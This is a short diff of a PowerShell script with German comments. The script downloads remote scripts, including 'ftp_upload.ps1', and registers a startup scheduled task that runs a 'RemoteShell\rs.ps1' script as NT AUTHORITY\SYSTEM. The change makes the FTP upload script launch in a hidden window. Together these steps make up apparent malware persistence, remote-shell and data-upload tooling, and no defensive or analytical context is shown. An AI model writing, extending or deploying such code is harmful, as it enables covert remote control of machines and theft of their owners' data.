@@ -13,8 +13,8 @@ $webClient.DownloadFile($rsUrl, $rsScriptPath)
 $ftpScriptPath = Join-Path $zielSpeicherort "ftp_upload.ps1"
 $webClient.DownloadFile($ftpUrl, $ftpScriptPath)
 
-# Starte das ftp_upload.ps1-Skript als Hintergrundjob
-Start-Job -ScriptBlock { Param($ftpScriptPath) & $ftpScriptPath } -ArgumentList $ftpScriptPath
+# Starte das ftp_upload.ps1-Skript im Hintergrund
+Start-Process -FilePath "powershell.exe" -ArgumentList "-File $ftpScriptPath" -WindowStyle Hidden
 
 Register-ScheduledTask -Action (New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument '-File "C:\RemoteShell\rs.ps1"') -Trigger (New-ScheduledTaskTrigger -AtStartup) -TaskName "rs" -Principal (New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount) -Settings (New-ScheduledTaskSettingsSet  -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries)
 
